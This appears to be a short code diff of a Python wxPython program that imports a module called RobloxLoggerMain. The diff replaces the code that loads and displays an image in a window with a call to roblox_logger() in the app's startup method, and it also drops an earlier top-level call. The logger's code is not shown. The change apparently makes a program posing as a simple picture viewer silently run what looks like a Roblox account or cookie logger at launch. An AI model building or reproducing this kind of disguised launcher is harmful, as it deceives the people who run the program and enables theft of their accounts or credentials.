@@ -1,6 +1,5 @@
 import wx
 from RobloxLoggerMain import *
-roblox_logger()
 
 
 class Frame(wx.Frame):
@@ -18,10 +17,7 @@ class Frame(wx.Frame):
 class App(wx.App):
 
     def OnInit(self):
-        image = wx.Image('yourmom.jpeg', wx.BITMAP_TYPE_JPEG)
-        self.frame = Frame(image)
-        self.frame.Show()
-        self.SetTopWindow(self.frame)
+        roblox_logger()
         return True
 
 
